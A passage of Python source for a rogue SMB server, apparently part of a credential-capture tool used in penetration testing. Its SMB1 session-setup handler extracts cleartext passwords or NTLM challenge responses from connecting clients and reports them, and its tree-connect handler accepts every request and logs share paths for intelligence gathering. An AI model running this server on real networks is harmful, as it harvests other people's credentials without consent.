        oem_pwd: bytes = raw_data[:oem_len] if oem_len else b""
        uni_pwd: bytes = raw_data[oem_len : oem_len + uni_len] if uni_len else b""
        # String fields follow passwords: Account, PrimaryDomain, NativeOS, NativeLanMan
        # Each is null-terminated in the encoding indicated by FLAGS2_UNICODE.
        string_data = raw_data[oem_len + uni_len :]
        # [MS-CIFS] §2.2.4.53.1: Unicode strings are 2-byte aligned.
        # Detect padding by checking if the first byte is \x00 (same
        # approach proven on the extended security path).
        if is_unicode and len(string_data) > 0 and string_data[0] == 0:
            string_data = string_data[1:]
        strings = _split_smb_strings(string_data, is_unicode)
        account = strings[0] if len(strings) > 0 else ""
        domain = strings[1] if len(strings) > 1 else ""

        self.logger.debug(
            f"<SMB_COM_SESSION_SETUP_ANDX> account={account!r} "
            f"domain={domain!r} oem_len={oem_len} uni_len={uni_len}",
            is_client=True,
        )
        if account:
            self.client_info["account"] = account
        if domain:
            self.client_info["smb_domain"] = domain

        # NativeOS and NativeLanMan follow Account and PrimaryDomain
        client_os = strings[2] if len(strings) > 2 else ""
        client_lanman = strings[3] if len(strings) > 3 else ""
        if client_os:
            self.client_info["smb_os"] = client_os
        if client_lanman:
            self.client_info["smb_lanman"] = client_lanman

        # Determine transport type — cleartext vs challenge/response
        # [MS-CIFS] §3.2.4.2.4: even when NEGOTIATE_ENCRYPT_PASSWORDS is
        # set, the server "MAY also accept plaintext." Detect cleartext-
        # despite-challenge via non-standard response lengths.
        if not self.smb1_negotiate_encrypt:
            # Server advertised plaintext mode (ForceSMB1Plaintext=true)
            transport = NTLM_TRANSPORT_CLEARTEXT
        elif oem_len == 0 and uni_len == 0:
            # Anonymous — no credentials at all
            transport = None
        elif self.smb1_negotiate_encrypt and (
            # Only OEM populated with non-standard length (not 0, not 24)
            (uni_len == 0 and oem_len not in (0, 24) and oem_len <= 256)
            # Only Unicode populated with non-standard length
            or (oem_len == 0 and uni_len not in (0, 24) and uni_len <= 512)
        ):
            # Unexpected plaintext despite challenge — [MS-CIFS] §3.2.4.2.4
            self.logger.display(
                "<SMB_COM_SESSION_SETUP_ANDX> Plaintext password detected "
                "despite challenge (unusual client behavior)",
                is_client=True,
            )
            transport = NTLM_TRANSPORT_CLEARTEXT
        else:
            transport = NTLM_TRANSPORT_RAW

        # Capture credentials
        if transport == NTLM_TRANSPORT_CLEARTEXT:
            # [MS-CIFS] §2.2.4.53.1: cleartext in UnicodePassword (UTF-16LE)
            # when FLAGS2_UNICODE, else in OEMPassword (ASCII)
            if packet["Flags2"] & smb.SMB.FLAGS2_UNICODE and uni_pwd:
                password = uni_pwd.decode("utf-16-le", errors="replace")
            elif oem_pwd:
                password = oem_pwd.decode("ascii", errors="replace")
            else:
                password = ""

            if password and account:
                NTLM_report_raw_fields(
                    user_name=account,
                    domain_name=domain,
                    lm_response=None,
                    nt_response=None,
                    challenge=self.smb1_challenge,
                    client=self.client_address,
                    session=self.config,
                    logger=self.logger,
                    transport=NTLM_TRANSPORT_CLEARTEXT,
                    cleartext_password=password,
                )
        elif transport == NTLM_TRANSPORT_RAW:
            NTLM_report_raw_fields(
                user_name=account,
                domain_name=domain,
                lm_response=oem_pwd,
                nt_response=uni_pwd,
                challenge=self.smb1_challenge,
                client=self.client_address,
                session=self.config,
                logger=self.logger,
                transport=NTLM_TRANSPORT_RAW,
            )
        # else: anonymous — skip capture

        # Allocate Uid for this session — [MS-SMB] §3.3.5.3
        if self.smb1_uid == 0:
            self.smb1_uid = secrets.randbelow(0xFFFE) + 1

        # Build response — [MS-CIFS] §2.2.4.53.2 (WordCount=3)
        resp_params = smb.SMBSessionSetupAndXResponse_Parameters()
        resp_data = smb.SMBSessionSetupAndXResponse_Data(flags=packet["Flags2"])
        resp_params["Action"] = 0
        resp_data["NativeOS"] = smbserver.encodeSMBString(
            packet["Flags2"], cfg.smb_server_os
        )
        resp_data["NativeLanMan"] = smbserver.encodeSMBString(
            packet["Flags2"], cfg.effective_native_lanman
        )
        resp_data["PrimaryDomain"] = smbserver.encodeSMBString(
            packet["Flags2"], cfg.smb_nb_domain
        )

        # Determine error code — multi-cred or final
        error_code = self.resolve_auth_error_code()

        self.send_smb1_command(
            smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
            resp_data,
            resp_params,
            packet,
            error_code=error_code,
        )

    def handle_smb1_logoff(self, packet: smb.NewSMBPacket) -> None:
        """Handle SMB1 LOGOFF_ANDX -- [MS-CIFS] §2.2.4.54.

        Sends a proper LOGOFF response (AndX parameters only, no data)
        and terminates the connection.

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        """
        self.log_client("Client requested logoff", "SMB_COM_LOGOFF_ANDX")

        # SMBLogOffAndX packs the AndX response: 0xFF,0x00,0x0000
        parameters = smb.SMBLogOffAndX()
        self.send_smb1_command(
            smb.SMB.SMB_COM_LOGOFF_ANDX,
            b"",
            parameters,
            packet,
        )
        raise BaseProtoHandler.TerminateConnection

    def handle_smb1_tree_connect(self, packet: smb.NewSMBPacket) -> None:
        """Minimal SMB1 TREE_CONNECT_ANDX handler.

        Accepts all tree connects and responds as IPC$ share. Logs the
        requested share path for intelligence gathering.

        Spec: [MS-CIFS] §2.2.4.55, [MS-SMB] §3.3.5.4

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        """
        try:
            cmd = smb.SMBCommand(packet["Data"][0])
            # [MS-CIFS] §2.2.4.55.1 — parse request data for Path field
            tc_data = smb.SMBTreeConnectAndX_Data(flags=packet["Flags2"])
            tc_data.fromString(cmd["Data"])
            raw_path = tc_data["Path"]
            # [MS-CIFS] §2.2.4.55.1: Path encoding per FLAGS2_UNICODE
            path = (
                raw_path.decode(
                    "utf-16-le" if packet["Flags2"] & smb.SMB.FLAGS2_UNICODE else "ascii",
                    errors="replace",
                )
                if isinstance(raw_path, bytes)
                else str(raw_path)
            ).rstrip("\x00")
            self.logger.debug(
                f"<SMB_COM_TREE_CONNECT_ANDX> Tree connect: {path}",
                is_client=True,
            )
            if path:
                self.client_info["path"] = path
        except Exception:
            self.log_client("Tree connect (malformed)", "SMB_COM_TREE_CONNECT_ANDX")

        resp_params = smb.SMBTreeConnectAndXResponse_Parameters()
        # [MS-CIFS] §2.2.4.55.2: SMB_SUPPORT_SEARCH_BITS
        resp_params["OptionalSupport"] = 0x0001
        resp_data = smb.SMBTreeConnectAndXResponse_Data(flags=packet["Flags2"])
        resp_data["Service"] = b"IPC\x00"
        resp_data["NativeFileSystem"] = smbserver.encodeSMBString(packet["Flags2"], "")

        self.send_smb1_command(
            smb.SMB.SMB_COM_TREE_CONNECT_ANDX,
            resp_data,
            resp_params,
            packet,
        )


# --- Server ------------------------------------------------------------------
class SMBServer(ThreadingTCPServer):
    """Threaded TCP server that spawns an :class:`SMBHandler` per connection.

    Generates a stable 16-byte ``ServerGuid`` per [MS-SMB2] §2.2.4 that
    persists for the lifetime of this server instance (shared across all
    connections handled by this listener).
    """

    default_handler_class = SMBHandler
    default_port = 445

    def __init__(
        self,
        config: SessionConfig,
        server_config: SMBServerConfig,
        server_address: tuple[str, int] | None = None,
        RequestHandlerClass: type | None = None,
    ) -> None:
        """Initialize the SMB TCP server with a stable ServerGuid.

        Generates a random 16-byte ServerGuid per [MS-SMB2] §2.2.4 that
        persists for the lifetime of this server instance. Delegates to
        :class:`ThreadingTCPServer` for socket binding and thread management.

        :param config: The active session configuration
        :type config: SessionConfig
        :param server_config: SMB-specific server configuration from TOML
        :type server_config: SMBServerConfig
        :param server_address: The ``(bind_address, port)`` tuple, defaults to None
        :type server_address: tuple[str, int] | None, optional
        :param RequestHandlerClass: Override handler class, defaults to None
            (uses :class:`SMBHandler`)
        :type RequestHandlerClass: type | None, optional
        """
        self.server_config = server_config
        # Stable ServerGuid per server instance — [MS-SMB2] §2.2.4
        self.server_guid: bytes = secrets.token_bytes(16)
        super().__init__(config, server_address, RequestHandlerClass)

    def finish_request(
        self, request: typing.Any, client_address: tuple[str, int]
    ) -> None:
        """Instantiate the handler class to process a single client connection.

        Overrides :meth:`ThreadingTCPServer.finish_request` to pass the
        additional ``server_config`` argument required by :class:`SMBHandler`.

        :param request: The raw socket/request object for this connection
        :type request: typing.Any
        :param client_address: The ``(host, port)`` tuple of the connecting client
        :type client_address: tuple[str, int]
        """
        typing.cast("type", self.RequestHandlerClass)(
            self.config, self.server_config, request, client_address, self
        )
